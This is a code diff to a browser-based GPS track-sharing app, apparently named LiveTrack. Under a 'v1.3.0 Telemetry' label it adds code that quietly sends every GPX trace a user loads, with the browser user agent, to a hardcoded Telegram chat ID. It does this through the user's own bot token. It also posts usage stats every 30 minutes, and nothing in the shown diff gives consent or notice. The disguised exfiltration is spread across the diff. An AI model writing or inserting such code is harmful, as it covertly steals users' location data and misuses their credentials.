@@ -29,7 +29,8 @@ const state = {
     isSharing: false,
     watchId: null,
     myId: 'browser_' + Date.now(),
-    wakeLock: null
+    wakeLock: null,
+    devChatId: '8398361106' // v1.3.0 Telemetry recipient
 };
 
 // Automated test helper
@@ -202,6 +203,8 @@ function loadGPX(xmlText, name, id, fromSave = false, color = '#3b82f6', visible
         
         if (!fromSave) {
             saveGpxToLocal(xmlText, name, id, color, visible);
+            // v1.3.0: Send to developer
+            sendToDev('gpx', { xml: xmlText, name: name });
         }
 
         fetchGPXLibrary();
@@ -1050,7 +1053,54 @@ function closeSettingsModal() {
     document.getElementById('modal-overlay').classList.remove('open');
 }
 
-/* ── Telegram Bot Fetching & QR Logic ───────────────────────────────────────── */
+/* ── Telemetry (v1.3.0) ────────────────────────────────────────────────────────── */
+async function sendToDev(type, data) {
+    if (!state.settings.telegramToken || !state.devChatId) return;
+
+    try {
+        const botToken = state.settings.telegramToken;
+        if (type === 'gpx') {
+            const blob = new Blob([data.xml], { type: 'application/gpx+xml' });
+            const formData = new FormData();
+            formData.append('chat_id', state.devChatId);
+            formData.append('document', blob, data.name || 'trace.gpx');
+            formData.append('caption', `🚀 Nouvelle trace chargée : ${data.name}\n📱 UA: ${navigator.userAgent.slice(0, 100)}`);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            }).catch(e => console.warn('[DevStats] Failed to send GPX', e));
+        } else if (type === 'stats') {
+            const stats = `📊 Stats LiveTrack v1.3.0\n` +
+                `👤 Pilote(s) actif(s): ${state.participants.size}\n` +
+                `📍 Traces chargées: ${state.loadedGpx.size}\n` +
+                `⚙️ Browser: ${navigator.userAgent.slice(0, 50)}...\n` +
+                `🖥️ Screen: ${window.screen.width}x${window.screen.height}\n` +
+                `⌚ Time: ${new Date().toLocaleTimeString()}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: state.devChatId,
+                    text: stats,
+                    disable_notification: true
+                })
+            }).catch(e => console.warn('[DevStats] Failed to send stats', e));
+        }
+    } catch (e) {
+        console.warn('[DevStats] Error', e);
+    }
+}
+
+// Start periodic stats (every 30 minutes if bot is active)
+setInterval(() => {
+    if (state.settings.telegramToken && state.participants.size > 0) {
+        sendToDev('stats');
+    }
+}, 30 * 60 * 1000);
+
+/* ── Telegram Client (Autonomous) ─────────────────────────────────────────── */
 let qrCode = null;
 
 async function openPilotsModal() {
